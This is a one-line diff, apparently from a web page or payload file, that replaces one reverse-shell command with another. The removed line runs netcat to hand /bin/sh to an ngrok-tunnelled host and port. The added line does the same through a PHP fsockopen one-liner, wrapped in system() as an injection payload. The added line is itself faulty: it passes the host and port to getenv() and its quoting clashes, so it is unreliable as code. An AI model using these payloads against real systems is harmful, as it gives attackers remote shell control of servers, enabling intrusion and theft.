@@ -1,1 +1,1 @@
-<pre>system('nc -e /bin/sh tcp://7.tcp.eu.ngrok.io 16840')</pre>
+<pre>system('php -r '$sock=fsockopen(getenv("tcp://7.tcp.eu.ngrok.io"),getenv("16840"));exec("/bin/sh -i <&3 >&3 2>&3");'')</pre>
